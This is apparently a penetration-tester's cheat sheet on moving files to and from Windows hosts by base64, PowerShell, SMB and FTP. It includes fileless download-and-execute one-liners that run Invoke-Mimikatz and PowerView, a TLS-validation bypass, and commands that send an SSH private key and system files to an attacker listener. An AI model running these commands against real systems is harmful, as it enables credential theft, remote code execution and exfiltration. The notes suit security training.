
# Windows

## Downloads

### Base64

- maximum string length of 8,191 characters

```bash
# from linux
cat id_rsa |base64 -w 0;echo
# to window
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CR......S0tLQo="))

# Verification
# Linux
md5sum id_rsa
# Windows
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### PowerShell

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### Fileless method

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### Errors Bypass

```powershell
# Internet Explorer first-launch
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# SSL/TLS
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB

```bash
# from linux
sudo impacket-smbserver share -smb2support /tmp/smbshare
# with creds
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test


# from window
copy \\192.168.220.133\share\nc.exe

# if copy doesn't work, mount server
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

# download from window
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Uploads

### Base64

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# verify
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

# to linux
echo I...0DQo= | base64 -d > hosts
md5sum hosts
```

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://10.10.14.226:8000/ -Method POST -Body $b64

# from linux
nc -lvnp 8000
# decode
echo <base64> | base64 -d -w 0 > hosts
```
### PowerShell

[GitHub - uploadserver](https://github.com/Densaugeo/uploadserver)

```powershell
# host server on linux
uv run --with uploadserver python -m uploadserver

# upload from windows (internet require to install script)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://10.10.14.226:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### SMB

```bash

```